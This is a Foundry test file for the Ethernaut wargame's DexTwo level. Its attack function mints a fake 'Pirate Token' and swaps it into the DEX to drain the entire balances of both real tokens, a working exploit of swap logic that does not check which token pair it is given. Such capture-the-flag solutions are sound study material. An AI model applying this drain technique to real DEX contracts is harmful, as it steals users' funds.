// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./utils/BaseTest.sol";
import "../src/Ethernaut.sol";
import "../src/levels/23-DexTwo/DexTwo.sol";
import "../src/levels/23-DexTwo/DexTwoFactory.sol";

contract DexTwoTest is Test, BaseTest {
    DexTwo public level;

    constructor() {
        levelFactory = new DexTwoFactory();
    }

    function setUp() public override {
        super.setUp();
        levelAddr = payable(_createLevelInstance());
        level = DexTwo(levelAddr);
    }

    function testAttack() public {
        _attack();
        _validateLevel();
    }

    function _attack() internal override {
        address token1 = level.token1();
        address token2 = level.token2();

        IERC20 maliciousToken = new SwappableTokenTwo(
            attacker,
            "Pirate Token",
            "PTK",
            1000
        );

        maliciousToken.approve(address(level), 100);
        maliciousToken.transfer(address(level), 100);
        level.swap(address(maliciousToken), token1, 100);

        maliciousToken.approve(address(level), 200);
        level.swap(address(maliciousToken), token2, 200);
    }
}
